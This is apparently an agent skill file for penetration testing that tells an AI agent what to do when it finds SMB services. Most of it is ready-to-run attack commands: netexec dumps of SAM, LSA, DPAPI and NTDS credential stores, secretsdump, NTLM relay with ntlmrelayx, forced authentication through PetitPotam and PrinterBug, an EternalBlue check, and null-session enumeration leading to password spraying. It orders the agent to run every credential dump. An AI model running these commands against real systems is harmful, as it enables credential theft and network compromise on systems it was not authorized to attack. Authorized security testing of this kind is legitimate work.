---
name: svc-smb
description: SMB gotchas — DPAPI dump trap, relay when signing disabled, credential dump order. Use when SMB is found. Triggers - ports 445/139, signing:False, null session, EternalBlue MS17-010, PetitPotam.
---

# SMB — Gotchas & Attack Chains

## DPAPI dump trap
`netexec smb HOST -u USER -p PASS --dpapi` bare = FULL dump (browser passwords, vault, cookies, Credential Manager).
Adding subcommands (`cookies`, `nosystem`, `wifi`) **LIMITS** output. Always bare `--dpapi` first.

## Credential dump order (with local admin)
Run ALL, in order — each gets different secrets:
1. `--sam` — local hashes
2. `--lsa` — service passwords, cached domain creds
3. `--dpapi` — user secrets (browser, vault, Credential Manager)
4. `--ntds` — DC only, all domain hashes
Fallback: `secretsdump.py DOMAIN/USER:PASS@HOST`

## SMB relay (signing disabled)
Check: `netexec smb TARGET` → if "signing: False" → relay is possible.
Generate target list: `netexec smb SUBNET --gen-relay-list relay.txt`
Relay: `impacket-ntlmrelayx -tf relay.txt -smb2support`
Trigger auth: Responder, mitm6, PetitPotam, PrinterBug.

## EternalBlue (MS17-010)
Windows 7 / Server 2008 R2 / Server 2012 (unpatched). Confirm: `nmap --script smb-vuln-ms17-010 -p 445 TARGET`.

## Null session → spray chain
`enum4linux-ng -A TARGET`, `rpcclient -U '' -N TARGET -c 'enumdomusers'`.
If null session works → user list → AS-REP roast / password spray.
